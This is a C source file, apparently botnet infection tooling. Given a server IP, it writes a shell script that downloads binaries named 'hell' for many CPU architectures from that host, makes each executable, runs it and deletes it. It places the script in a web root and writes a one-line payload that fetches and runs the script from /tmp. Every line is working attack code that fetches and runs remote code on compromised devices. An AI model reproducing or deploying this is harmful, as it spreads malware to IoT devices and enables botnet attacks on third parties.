#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
	
	if(argc != 2) {
		printf("Usage: %s IP\n", argv[0]);
		exit(0);
	}
	
	char buf[1000] = {0};
	char *ip;
	ip = argv[1];
	
	printf("Making SH File\n");
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.i486;chmod 777 hell.i486;./hell.i486;rm -rf hell.i486' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.i686;chmod 777 hell.i686;./hell.i686;rm -rf hell.i686' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.mips;chmod 777 hell.mips;./hell.mips;rm -rf hell.mips' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.mips64;chmod 777 hell.mips64;./hell.mips64;rm -rf hell.mips64' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.mpsl;chmod 777 hell.mpsl;./hell.mpsl;rm -rf hell.mpsl' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.armeb;chmod 777 hell.armeb;./hell.armeb;rm -rf hell.armeb' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.armtl;chmod 777 hell.armtl;./hell.armtl;rm -rf hell.armtl' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.arm;chmod 777 hell.arm;./hell.arm;rm -rf hell.arm' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.arm5;chmod 777 hell.arm5;./hell.arm5;rm -rf hell.arm5' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.arm6;chmod 777 hell.arm6;./hell.arm6;rm -rf hell.arm6' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.arm7;chmod 777 hell.arm7;./hell.arm7;rm -rf hell.arm7' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.ppc-440fp;chmod 777 hell.ppc-440fp;./hell.ppc-440fp;rm -rf hell.ppc-440fp' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.ppc;chmod 777 hell.ppc;./hell.ppc;rm -rf hell.ppc' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.spc;chmod 777 hell.spc;./hell.spc;rm -rf hell.spc' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.m68k;chmod 777 hell.m68k;./hell.m68k;rm -rf hell.m68k' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.sh4;chmod 777 hell.sh4;./hell.sh4;rm -rf hell.sh4' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.arc;chmod 777 hell.arc;./hell.arc;rm -rf hell.arc' >> BabaBitch.sh", ip);
	system(buf);
	sprintf(buf, "echo 'wget http://%s/DISISHELL/hell.x64;chmod 777 hell.x64;./hell.x64;rm -rf hell.x64' >> BabaBitch.sh", ip);
	system(buf);
	printf("Finished Making SH FILE\n");
	sleep(1);
	printf("Moving SH File\n");
	system("mv BabaBitch.sh /var/www/html");
	sleep(1);
	printf("Payload in text file!\n");
	sprintf(buf, "echo 'cd /tmp || cd /etc;wget http://%s/BabaBitch.sh;chmod 777 BabaBitch.sh;./BabaBitch.sh;rm -rf BabaBitch.sh' >> payload.txt", ip);
	system(buf);
	exit(0);
}